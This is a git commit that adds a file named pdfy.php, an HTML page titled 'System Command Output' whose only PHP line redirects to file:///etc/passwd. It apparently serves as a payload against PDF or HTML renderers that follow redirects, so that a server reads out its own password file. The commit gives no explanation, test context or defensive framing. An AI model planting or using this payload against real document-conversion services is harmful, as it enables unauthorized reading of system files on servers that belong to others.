75099cac0df9db55090ce4f9ee3a50f2d59a42e4
antonade <opzaom@gmail.com>
2025-06-25 12:31:46 +0700

    Create pdfy.php

---
+++ pdfy.php
@@ -0,0 +1,11 @@
+<!DOCTYPE html>
+<html>
+  <html>
+    <body>
+      <h1>System Command Output:</h1>
+      <?php
+        header('Location: file:///etc/passwd');
+      ?>
+    </body>
+  </html>
+</html>
